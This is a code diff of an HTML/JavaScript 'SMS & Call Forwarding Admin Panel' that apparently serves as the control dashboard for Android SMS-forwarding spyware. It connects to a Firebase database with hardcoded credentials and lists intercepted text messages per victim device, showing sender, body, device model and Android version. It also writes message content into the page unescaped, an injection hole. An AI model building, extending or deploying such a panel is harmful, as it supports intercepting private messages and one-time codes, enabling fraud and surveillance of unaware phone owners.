@@ -1,14 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from myadmin2.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 30 Nov 2025 07:36:25 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SMS & Call Forwarding Admin Panel</title>
-    <script src="../www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
-    <script src="../www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
     <style>
         /* Enhanced Mobile-First CSS */
         :root {
@@ -1127,7 +1124,7 @@
     <script>
         // Firebase configuration
         const firebaseConfig = {
-            apiKey: "AIzaSyBVDYEtAGFGns_47nksXvKYRUsPLDZvw30",
+           apiKey: "AIzaSyBVDYEtAGFGns_47nksXvKYRUsPLDZvw30",
   authDomain: "shivacus.firebaseapp.com",
   databaseURL: "https://shivacus-default-rtdb.firebaseio.com",
   projectId: "shivacus",
@@ -1135,7 +1132,6 @@
   messagingSenderId: "163881466696",
   appId: "1:163881466696:web:739beca696f7998c4b117d"
         };
-        
 
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
@@ -1737,38 +1733,15 @@
             }
         }
 
-        // OPTIMIZED: Enhanced SMS listener setup for instant updates
+        // Function to manage listener setup and cleanup
         function setupDeviceListeners(deviceId) {
             if (activeDeviceRef) activeDeviceRef.off();
             if (activeSmsRef) activeSmsRef.off();
 
             activeDeviceRef = database.ref('devices/' + deviceId);
             
-            // OPTIMIZED: Listen to SMS with child_added for instant updates
+            // FIXED: Listen to the correct SMS path - root level sms_forward
             activeSmsRef = database.ref('sms_forward');
-            
-            // Listen for new SMS messages specifically
-            activeSmsRef.orderByChild('timestamp').startAt(Date.now()).on('child_added', (snapshot) => {
-                const newSms = snapshot.val();
-                if (newSms && newSms.deviceId === deviceId) {
-                    // New SMS arrived - add it to the UI immediately
-                    addSmsToUI(newSms, snapshot.key);
-                    
-                    // Show notification for new SMS
-                    showNotification(
-                        'New SMS Received',
-                        `From: ${newSms.sender || 'Unknown'}`,
-                        'info',
-                        3000
-                    );
-                }
-            });
-
-            // Also listen for value changes to handle initial load and refreshes
-            activeSmsRef.on('value', (snapshot) => {
-                const allSmsData = snapshot.val();
-                updateSMSUI(allSmsData);
-            });
 
             activeDeviceRef.on('value', (snapshot) => {
                 const device = snapshot.val();
@@ -1832,45 +1805,15 @@
                     updateSmsSendUI(device);
                 }
             });
+
+            // FIXED: Listen to all SMS and filter by deviceId
+            activeSmsRef.on('value', (snapshot) => {
+                const allSmsData = snapshot.val();
+                updateSMSUI(allSmsData);
+            });
         }
 
-        // OPTIMIZED: Function to add a single SMS to UI immediately
-        function addSmsToUI(sms, smsId) {
-            const smsMessagesEl = document.getElementById('smsMessages');
-            const smsCountEl = document.getElementById('smsCount');
-            
-            // Create new SMS element
-            const smsElement = document.createElement('div');
-            smsElement.className = 'sms-message';
-            smsElement.id = 'sms-' + smsId;
-            smsElement.innerHTML = `
-                <div class="sms-header">
-                    <span class="sms-sender">📱 ${sms.sender || 'Unknown'}</span>
-                    <span class="sms-time">${new Date(sms.timestamp).toLocaleString()}</span>
-                </div>
-                <div class="sms-body">${sms.message || 'No message content'}</div>
-                ${sms.deviceModel ? `<div class="sms-info"><small>Device: ${sms.deviceModel} (Android ${sms.androidVersion})</small></div>` : ''}
-            `;
-            
-            // Add animation for new message
-            smsElement.style.animation = 'fadeIn 0.5s ease';
-            
-            // Add to top of the list
-            if (smsMessagesEl.firstChild && smsMessagesEl.firstChild.className === 'text-center text-muted p-4') {
-                smsMessagesEl.innerHTML = '';
-            }
-            
-            smsMessagesEl.insertBefore(smsElement, smsMessagesEl.firstChild);
-            
-            // Update SMS count
-            const currentCount = parseInt(smsCountEl.textContent) || 0;
-            smsCountEl.textContent = currentCount + 1;
-            
-            // Auto-scroll to top to show new message
-            smsMessagesEl.scrollTop = 0;
-        }
-
-        // OPTIMIZED: Enhanced updateSMSUI function
+        // COMPLETELY FIXED: SMS display function for Firebase structure
         function updateSMSUI(allSmsData) {
             const smsMessagesEl = document.getElementById('smsMessages');
             const smsCountEl = document.getElementById('smsCount');
@@ -1912,33 +1855,21 @@
                 return;
             }
             
-            // Display SMS messages with animation for new ones
-            smsMessagesEl.innerHTML = smsArray.map((sms, index) => {
-                const isNew = index === 0; // Mark the latest message as new
-                const animationClass = isNew ? 'fade-in' : '';
-                return `
-                    <div class="sms-message ${animationClass}" id="sms-${sms.id}">
-                        <div class="sms-header">
-                            <span class="sms-sender">📱 ${sms.sender || 'Unknown'}</span>
-                            <span class="sms-time">${new Date(sms.timestamp).toLocaleString()}</span>
-                        </div>
-                        <div class="sms-body">${sms.message || 'No message content'}</div>
-                        ${sms.deviceModel ? `<div class="sms-info"><small>Device: ${sms.deviceModel} (Android ${sms.androidVersion})</small></div>` : ''}
+            // Display SMS messages
+            smsMessagesEl.innerHTML = smsArray.map(sms => `
+                <div class="sms-message">
+                    <div class="sms-header">
+                        <span class="sms-sender">📱 ${sms.sender || 'Unknown'}</span>
+                        <span class="sms-time">${new Date(sms.timestamp).toLocaleString()}</span>
                     </div>
-                `;
-            }).join('');
-            
-            // Auto-scroll to top to show latest messages
-            smsMessagesEl.scrollTop = 0;
+                    <div class="sms-body">${sms.message || 'No message content'}</div>
+                    ${sms.deviceModel ? `<div class="sms-info"><small>Device: ${sms.deviceModel} (Android ${sms.androidVersion})</small></div>` : ''}
+                </div>
+            `).join('');
         }
 
-        // OPTIMIZED: Enhanced refreshSMS function
         function refreshSMS() {
             if (selectedDeviceId) {
-                // Clear existing SMS display first for better UX
-                const smsMessagesEl = document.getElementById('smsMessages');
-                smsMessagesEl.innerHTML = '<div class="text-center text-muted p-4">Refreshing SMS...</div>';
-                
                 database.ref('sms_forward').once('value').then((snapshot) => {
                     const allSmsData = snapshot.val();
                     updateSMSUI(allSmsData);
@@ -1946,12 +1877,6 @@
                         'SMS Refreshed',
                         'SMS messages refreshed successfully!',
                         'success'
-                    );
-                }).catch((error) => {
-                    showNotification(
-                        'Refresh Failed',
-                        'Error refreshing SMS: ' + error.message,
-                        'error'
                     );
                 });
             }
@@ -2758,6 +2683,4 @@
         document.head.appendChild(style);
     </script>
 </body>
-
-<!-- Mirrored from myadmin2.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 30 Nov 2025 07:36:27 GMT -->
 </html>
